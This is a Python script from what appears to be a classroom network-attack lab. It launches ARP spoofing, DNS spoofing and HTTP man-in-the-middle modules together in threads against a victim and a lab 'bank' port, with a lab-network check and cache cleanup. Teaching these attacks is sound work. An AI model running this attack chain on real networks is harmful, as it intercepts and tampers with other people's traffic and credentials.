#!/usr/bin/env python3
"""
attacker/run_attack.py
======================

Orchestrator — starts arp_spoof + dns_spoof + http_mitm as background
threads in one process, then blocks on Ctrl-C and triggers cleanup on
the way out.

When to use this vs. running the modules separately
---------------------------------------------------
* Demo / classroom: run the modules in SEPARATE tmux panes (see
  docs/classroom_script.md).  Students need to see one log stream per
  attack phase, otherwise the timeline blurs.

* Quick smoke-test: use run_attack.py.  One terminal, one Ctrl-C, one
  guaranteed cleanup.

We intentionally do NOT fork sub-processes — we import the modules and
run their main loops in threads.  That way:

  * Ctrl-C in this process kills everything at once.
  * The atexit handler in arp_spoof.py heals the caches whether the
    user used the orchestrator or not.
  * stdout from all three modules is interleaved in one place, which
    makes log search trivial.

The trade-off is that scapy's sniff() blocks one thread per sniffer,
so this process will hold three threads + the main thread.  That is
fine in a lab.
"""

from __future__ import annotations

import argparse
import signal
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from shared import config, colors                       # noqa: E402
from shared.network_utils import assert_lab_network     # noqa: E402

# Importing siblings.  We use absolute imports (not `from . import …`)
# because students will launch this script with plain `python3
# attacker/run_attack.py`, which does NOT establish a package context
# and therefore breaks relative imports.  Absolute imports work in
# BOTH `python3 attacker/run_attack.py` and `python3 -m attacker.run_attack`.
from attacker import arp_spoof, dns_spoof, http_mitm    # type: ignore  # noqa: E402


def _run_safely(name: str, target, argv: list[str]) -> None:
    """
    Run module.main() with a temporary sys.argv so its argparse works.

    We mutate sys.argv around the call because every leaf script was
    written to stand alone with argparse — this lets us reuse them
    without refactoring into library functions.
    """
    saved = sys.argv
    try:
        sys.argv = argv
        target()
    except SystemExit as exc:
        # argparse calls sys.exit(); we don't want that to kill the
        # orchestrator, so absorb it and log.
        colors.warn(f"{name} exited (code={exc.code})")
    except Exception as exc:                            # pragma: no cover
        colors.bad(f"{name} crashed: {exc!r}")
    finally:
        sys.argv = saved


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Run the full Module 5 attack chain in one process.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--victim",    default=config.VICTIM_IP)
    p.add_argument("--gateway",   default=config.GATEWAY_IP)
    p.add_argument("--iface",     default=config.DEFAULT_IFACE)
    p.add_argument("--answer-ip", default=config.DNS_SPOOF_ANSWER_IP)
    p.add_argument("--bank-port", type=int, default=config.BANK_PORT)
    return p.parse_args()


def main() -> None:
    args = parse_args()
    colors.banner("attacker/run_attack.py", role="ATTACKER / ORCHESTRATOR")

    assert_lab_network(args.victim)
    assert_lab_network(args.gateway)
    assert_lab_network(args.answer_ip)

    # ---- spin up the three modules as daemon threads ----
    threads: list[threading.Thread] = []

    def spawn(name: str, target, argv: list[str]) -> None:
        t = threading.Thread(
            target=_run_safely,
            name=name,
            args=(name, target, argv),
            daemon=True,         # die with the parent on Ctrl-C
        )
        t.start()
        threads.append(t)
        # Stagger startup by a beat so log lines do not interleave during
        # the first second.  Pure cosmetics; remove if you don't care.
        time.sleep(0.5)

    spawn("arp_spoof", arp_spoof.main, [
        "arp_spoof.py",
        "--victim",  args.victim,
        "--gateway", args.gateway,
        "--iface",   args.iface,
    ])
    spawn("dns_spoof", dns_spoof.main, [
        "dns_spoof.py",
        "--iface",     args.iface,
        "--answer-ip", args.answer_ip,
    ])
    spawn("http_mitm", http_mitm.main, [
        "http_mitm.py",
        "--iface",     args.iface,
        "--victim",    args.victim,
        "--bank-port", str(args.bank_port),
    ])

    colors.ok("All three modules launched.  Ctrl-C to stop and clean up.")

    # Block in the main thread until a signal is received.  The threads
    # themselves install handlers for SIGINT, but the main thread also
    # needs to wake up so we can return from main() cleanly.
    stop_evt = threading.Event()

    def _sig(signum, _frame):
        colors.warn(f"Orchestrator caught signal {signum} — stopping")
        stop_evt.set()
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    while not stop_evt.is_set():
        stop_evt.wait(1.0)

    colors.info("Waiting for threads to drain (max 5s)…")
    for t in threads:
        t.join(timeout=5.0)
    colors.ok("Orchestrator done.  arp_spoof.atexit will heal caches now.")


if __name__ == "__main__":
    main()
